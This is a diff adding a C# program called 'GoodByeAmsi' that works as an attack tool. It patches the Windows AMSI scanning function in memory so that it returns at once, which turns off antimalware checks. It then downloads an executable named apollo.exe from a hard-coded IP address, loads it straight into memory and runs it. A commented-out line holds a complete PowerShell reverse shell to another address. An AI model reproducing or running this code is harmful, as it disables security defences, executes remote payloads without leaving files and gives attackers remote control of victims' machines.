@@ -1,0 +1,62 @@
+using System;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using PowerShell = System.Management.Automation.PowerShell;
+
+namespace GoodByeAmsi
+{
+    internal class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
+        static void Main(string[] args)
+        {
+            PowerShell powershell = PowerShell.Create();
+            powershell.AddCommand("Get-Process");
+            powershell.Invoke();
+            powershell.Dispose();
+
+            foreach (var assembly in AppDomain.CurrentDomain.GetAssemblies())
+            {
+                if (assembly.FullName.Contains("System.Management.Automation"))
+                {
+                    foreach (var module in assembly.GetTypes())
+                    {
+                        if(module.FullName.Contains("System.Management.Automation.AmsiUtils")) {
+                            foreach(var method in module.GetRuntimeMethods())
+                            {
+                                if (method.Name == "ScanContent")
+                                {
+                                    RuntimeHelpers.PrepareMethod(method.MethodHandle);
+                                    IntPtr ptr = method.MethodHandle.GetFunctionPointer();
+
+                                    byte[] patch = new byte[] { 0xC3 };
+                                    VirtualProtect(ptr, patch.Length, 0x40, out uint oldProtect);
+                                    Marshal.Copy(patch, 0, ptr, patch.Length);
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            //string script = @"$client = New-Object System.Net.Sockets.TCPClient('10.0.3.2',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+
+            string script = @"$bytes = (Invoke-WebRequest ""http://192.168.100.101:8000/apollo.exe"").Content;
+                            $loadedAssembly = [System.Reflection.Assembly]::Load($bytes);
+                            $typeName = ""Apollo.Program"";
+                            $type = $loadedAssembly.GetType($typeName);
+                            $instance = [Activator]::CreateInstance($type);
+                            $methodName = ""Execute"";
+                            $method = $type.GetMethod($methodName);
+                            $result = $method.Invoke($instance, $null);";
+            
+            powershell = PowerShell.Create();
+            powershell.AddScript(script);
+            powershell.Invoke();
+
+        }
+    }
+}
